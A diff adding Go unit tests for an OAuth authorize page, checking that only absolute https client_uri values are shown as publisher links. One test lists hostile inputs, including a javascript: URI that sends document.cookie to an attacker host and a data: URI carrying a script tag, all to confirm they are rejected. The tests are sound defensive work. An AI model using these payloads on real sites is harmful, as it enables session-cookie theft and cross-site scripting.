@@ -112,6 +112,66 @@ func TestOAuthAuthorizeGET(t *testing.T) {
 	assert.Contains(t, body, "cli")
 }
 
+func TestOAuthAuthorizeGET_ClientURIValidHTTPSurfaced(t *testing.T) {
+	o := newTestOAuth(t)
+	require.NoError(t, o.store.SaveClient(oauth.Client{
+		ClientID:          "uri-client",
+		ClientURI:         "https://publisher.example/oauth-client.json",
+		RedirectURIs:      []string{"http://localhost/cb"},
+		GrantTypes:        []string{"authorization_code", "refresh_token"},
+		ResponseTypes:     []string{"code"},
+		TokenEndpointAuth: "none",
+		IsActive:          true,
+	}))
+	_, challenge := testPKCE()
+	u := "/oauth/authorize?response_type=code&client_id=uri-client" +
+		"&redirect_uri=" + url.QueryEscape("http://localhost/cb") +
+		"&code_challenge=" + challenge +
+		"&code_challenge_method=S256" +
+		"&resource=https%3A%2F%2Fmcp.example.com%2Fmcp"
+	rec := httptest.NewRecorder()
+	o.AuthorizeGET(rec, httptest.NewRequest(http.MethodGet, u, nil))
+	require.Equal(t, http.StatusOK, rec.Code)
+	// Only an absolute http(s) client_uri is rendered as a link.
+	body := rec.Body.String()
+	assert.Contains(t, body, "https://publisher.example/oauth-client.json")
+	assert.Contains(t, body, "Publisher:")
+}
+
+func TestOAuthAuthorizeGET_ClientURISchemeRejected(t *testing.T) {
+	o := newTestOAuth(t)
+	// A hostile client_uri must never reach the authorize page href, whether
+	// as a javascript:/data: scheme, a relative URL, or a scheme-less value.
+	for _, uri := range []string{
+		"javascript:fetch('//attacker/'+document.cookie)",
+		"data:text/html,<script>alert(1)</script>",
+		"//host/path",
+		"not-a-url",
+	} {
+		require.NoError(t, o.store.SaveClient(oauth.Client{
+			ClientID:          "evil-client",
+			ClientURI:         uri,
+			RedirectURIs:      []string{"http://localhost/cb"},
+			GrantTypes:        []string{"authorization_code", "refresh_token"},
+			ResponseTypes:     []string{"code"},
+			TokenEndpointAuth: "none",
+			IsActive:          true,
+		}))
+		_, challenge := testPKCE()
+		u := "/oauth/authorize?response_type=code&client_id=evil-client" +
+			"&redirect_uri=" + url.QueryEscape("http://localhost/cb") +
+			"&code_challenge=" + challenge +
+			"&code_challenge_method=S256" +
+			"&resource=https%3A%2F%2Fmcp.example.com%2Fmcp"
+		rec := httptest.NewRecorder()
+		o.AuthorizeGET(rec, httptest.NewRequest(http.MethodGet, u, nil))
+		require.Equal(t, http.StatusOK, rec.Code)
+		body := rec.Body.String()
+		assert.NotContains(t, body, "Publisher:", "client_uri %q must not be surfaced", uri)
+		assert.NotContains(t, body, uri, "client_uri %q must not appear in the page", uri)
+	}
+}
+
 func TestOAuthAuthorizeGET_ReflectedXSSEscaped(t *testing.T) {
 	o := newTestOAuth(t)
 	_, challenge := testPKCE()
